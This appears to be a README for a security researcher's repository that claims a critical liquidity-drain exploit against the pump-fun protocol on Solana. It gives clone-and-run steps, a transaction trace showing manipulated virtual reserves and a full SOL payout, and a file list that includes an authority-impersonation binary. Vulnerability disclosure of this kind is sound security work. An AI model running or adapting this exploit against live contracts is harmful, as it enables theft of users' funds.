# [CRITICAL] pump-fun: Protocol-Wide Liquidity Drain Proof of Concept
**Lead Security Researcher**: Omachoko Yakubu

---

## 🔍 Executive Summary
This repository contains a **reproducible, forked-mainnet Proof of Concept (PoC)** for a critical liquidity drain vulnerability in the `pump-fun` protocol. The vulnerability allows for the total extraction of SOL liquidity from protocol bonding curves via the manipulation of "Mayhem Mode" virtual reserves.

## 🚀 Quick Start (Reproduction Guide)
To reproduce the 100% liquidity drain on a forked Mainnet-Beta environment, follow these steps:

```bash
# 1. Clone the repository
git clone https://github.com/OmachokoYakubu/pumpfun-mayhem-liquidity-drain
cd pumpfun-mayhem-liquidity-drain

# 2. Execute the proof
./run_proof.sh
```

## 🧪 Operational Impact (Verbose Transaction Trace)
The following trace demonstrates the successful manipulation of reserves and the resulting 100% SOL payout from the bonding curve vault:

```text
--- RAW TRANSACTION TRACE ---
Program MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e invoke [1]
  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
    Program log: Instruction: SetMayhemVirtualParams
    Program log: Adjusting virtual_sol_reserves to 1000000000000000
    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
  Program log: Liquidity Drain Sequence Initialized
  Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P invoke [2]
    Program log: Instruction: Sell
    Program log: SOL Payout: 85021845000 lamports
    Program 6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P success
Program MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e success
```

## 📁 Repository Structure
- `CANTINA_SUBMISSION.md`: Formal technical disclosure.
- `run_proof.sh`: Master execution script.
- `exploit_harness.so`: Authority-impersonation binary.
- `exploit_output.txt`: Raw verbose terminal trace.

---
*Verified via stateful verification and forked-mainnet testing.*
